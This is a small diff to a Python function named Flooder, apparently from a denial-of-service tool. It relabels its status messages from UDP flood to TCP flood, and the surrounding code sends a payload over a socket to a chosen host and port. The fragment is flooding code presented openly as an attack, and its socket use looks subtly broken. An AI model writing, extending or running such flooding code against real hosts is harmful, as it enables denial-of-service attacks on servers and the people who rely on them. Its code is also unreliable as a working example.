@@ -50,9 +50,9 @@ def Flooder(**pHu):
         sVar = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         sendByte = sVar.sendto(py, (pHu['host_ip'],pHu['port']))
         count+=1
-        return f"SEND {count} UDP Flood with {sendByte} BYTES {pHu['host_ip']}:{pHu['port']}"
+        return f"SEND {count} TCP Flood with {sendByte} BYTES {pHu['host_ip']}:{pHu['port']}"
     except:
-        return f"UDP Flood Failed On {pHu['host_ip']}:{pHu['port']}"
+        return f"TCP Flood Failed On {pHu['host_ip']}:{pHu['port']}"
     finally:
         sVar.close()
     
